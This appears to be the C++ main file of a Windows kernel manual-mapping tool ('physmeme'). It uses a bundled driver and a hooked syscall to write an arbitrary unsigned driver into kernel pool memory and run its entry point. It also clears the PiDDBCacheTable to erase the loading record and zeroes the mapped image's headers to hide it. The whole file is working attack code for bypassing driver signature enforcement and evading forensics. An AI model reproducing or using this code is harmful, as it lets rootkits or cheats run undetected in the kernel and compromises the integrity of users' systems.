#include "kernel_ctx/kernel_ctx.h"
#include "drv_image/drv_image.h"
#include "raw_driver.hpp"

int __cdecl main(int argc, char** argv)
{
	if (argc < 2)
	{
		std::perror("[-] invalid use, please provide a path to a driver\n");
		return -1;
	}

	std::vector<std::uint8_t> drv_buffer;
	util::open_binary_file(argv[1], drv_buffer);
	if (!drv_buffer.size())
	{
		std::perror("[-] invalid drv_buffer size\n");
		return -1;
	}

	physmeme::drv_image image(drv_buffer);
	if (!physmeme::load_drv())
	{
		std::perror("[!] unable to load driver....\n");
		return -1;
	}

	physmeme::kernel_ctx kernel_ctx;
	std::printf("[+] driver has been loaded...\n");
	std::printf("[+] %s mapped physical page -> 0x%p\n", physmeme::syscall_hook.first, physmeme::psyscall_func.load());
	std::printf("[+] %s page offset -> 0x%x\n", physmeme::syscall_hook.first, physmeme::nt_page_offset);

	const auto drv_timestamp = util::get_file_header((void*)raw_driver)->TimeDateStamp;
	if (!kernel_ctx.clear_piddb_cache(physmeme::drv_key, drv_timestamp))
	{
		// this is because the signature might be broken on these versions of windows.
		perror("[-] failed to clear PiDDBCacheTable.\n");
		return -1;
	}

	const auto _get_export_name = [&](const char* base, const char* name)
	{
		return reinterpret_cast<std::uintptr_t>(util::get_kernel_export(base, name));
	};

	image.fix_imports(_get_export_name);
	image.map();

	const auto pool_base = kernel_ctx.allocate_pool(image.size(), NonPagedPool);
	image.relocate(pool_base);
	kernel_ctx.write_kernel(pool_base, image.data(), image.size());
	auto entry_point = reinterpret_cast<std::uintptr_t>(pool_base) + image.entry_point();

	auto result = kernel_ctx.syscall<DRIVER_INITIALIZE>
	(
		reinterpret_cast<void*>(entry_point),
		reinterpret_cast<std::uintptr_t>(pool_base),
		image.size()
	);
	std::printf("[+] driver entry returned: 0x%p\n", result);

	kernel_ctx.zero_kernel_memory(pool_base, image.header_size());
	if (!physmeme::unload_drv())
	{
		std::perror("[!] unable to unload driver... all handles closed?\n");
		return -1;
	}

	std::printf("[=] press enter to close\n");
	std::cin.get();
}